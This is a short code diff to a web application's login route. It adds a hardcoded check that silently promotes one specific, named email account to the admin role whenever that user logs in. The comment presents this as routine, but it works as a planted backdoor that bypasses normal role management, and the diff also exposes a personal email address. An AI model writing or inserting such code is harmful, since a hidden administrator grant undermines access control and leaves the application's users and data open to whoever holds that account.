@@ -101,6 +101,12 @@ router.post("/login", async (req, res) => {
             .set({ lastLoginAt: new Date() })
             .where(eq(users.id, user.id));
 
+        // Auto-promote specific user to admin if not already
+        if (user.email.toLowerCase() === "hamzali200410@gmail.com" && user.role !== "admin") {
+            await db.update(users).set({ role: "admin" }).where(eq(users.id, user.id));
+            user.role = "admin";
+        }
+
         // Set session
         req.session.userId = user.id;
         if (user.role === "admin") {
